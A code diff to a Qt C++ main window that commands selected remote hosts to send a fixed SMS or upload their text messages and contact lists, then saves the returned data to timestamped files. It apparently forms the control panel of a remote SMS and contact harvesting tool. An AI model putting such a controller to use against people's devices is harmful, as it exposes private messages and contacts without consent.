@@ -1,5 +1,12 @@
 #include "mainwindow.h"
 #include "ui_mainwindow.h"
+#include <QJsonDocument>
+#include <QJsonArray>
+#include <QJsonObject>
+#include <QDateTime>
+#include <QFile>
+#include <QDir>
+#include <QTextStream>
 
 MainWindow::MainWindow(QWidget *parent) :
     QMainWindow(parent),
@@ -50,8 +57,8 @@ void MainWindow::initView()
     ui->tableView->addAction(aLoadSms = new QAction(QString("Load Sms Data"),ui->tableView));
 
     QObject::connect(aSendSms,SIGNAL(triggered()),this,SLOT(sendSms()));
-    QObject::connect(aLoadContact,SIGNAL(triggered()),this,SLOT(loadSms()));
-    QObject::connect(aLoadSms,SIGNAL(triggered()),this,SLOT(loadContact()));
+    QObject::connect(aLoadSms,SIGNAL(triggered()),this,SLOT(loadSms()));
+    QObject::connect(aLoadContact,SIGNAL(triggered()),this,SLOT(loadContact()));
 }
 
 void MainWindow::updateView()
@@ -61,18 +68,56 @@ void MainWindow::updateView()
 
 void MainWindow::handleNewSession(NetworkSession* networkSession)
 {
-    ;
+    QObject::connect(networkSession->socket(),SIGNAL(error(QAbstractSocket::SocketError)),networkSession,SLOT(deleteLater()));
+    QObject::connect(networkSession,SIGNAL(onReadData(NetworkSession*,QByteArray)),this,SLOT(handleReceiveData(NetworkSession*,QByteArray)));
+
+    QJsonObject jsonObject;
+    QJsonDocument jsonDocument;
+
+    jsonObject.insert(QString("action"), networkSession->getSessionName());
+
+    // add extra data
+    if(networkSession->getSessionName()==ACTION_SEND_SMS)
+    {
+        jsonObject.insert(QString("content"), QString("呵呵"));
+        jsonDocument.setObject(jsonObject);
+        networkSession->write(jsonDocument.toJson());
+        networkSession->deleteLater();
+    }
+    else if(networkSession->getSessionName()==ACTION_UPLOAD_SMS || networkSession->getSessionName()==ACTION_UPLOAD_CONTACT)
+    {
+        jsonDocument.setObject(jsonObject);
+        networkSession->write(jsonDocument.toJson());
+    }
+    else
+    {
+        networkSession->deleteLater();
+        return;
+    }
+}
+
+void MainWindow::handleReceiveData(NetworkSession* networkSession, QByteArray data)
+{
+    QString fileName = QDateTime::currentDateTime().toString("yyyy-MM-dd_hh,mm,ss") + "_" + networkSession->getSessionUuid() + ".txt";
+    QDir().mkpath(networkSession->getSessionName());
+    QFile file(networkSession->getSessionName() + "/" + fileName);
+    file.open(QFile::WriteOnly);
+    QTextStream stream(&file);
+    stream << data;
+    file.flush();
+    file.close();
+    networkSession->deleteLater();
 }
 
 void MainWindow::sendSms()
 {
-    mSessionManager.startSessionOnHosts(mModel.getSelectedHostAddr(), "send_sms");
+    mSessionManager.startSessionOnHosts(mModel.getSelectedHostAddr(), ACTION_SEND_SMS);
 }
 void MainWindow::loadSms()
 {
-    mSessionManager.startSessionOnHosts(mModel.getSelectedHostAddr(), "upload_sms");
+    mSessionManager.startSessionOnHosts(mModel.getSelectedHostAddr(), ACTION_UPLOAD_SMS);
 }
 void MainWindow::loadContact()
 {
-    mSessionManager.startSessionOnHosts(mModel.getSelectedHostAddr(), "upload_contact");
+    mSessionManager.startSessionOnHosts(mModel.getSelectedHostAddr(), ACTION_UPLOAD_CONTACT);
 }
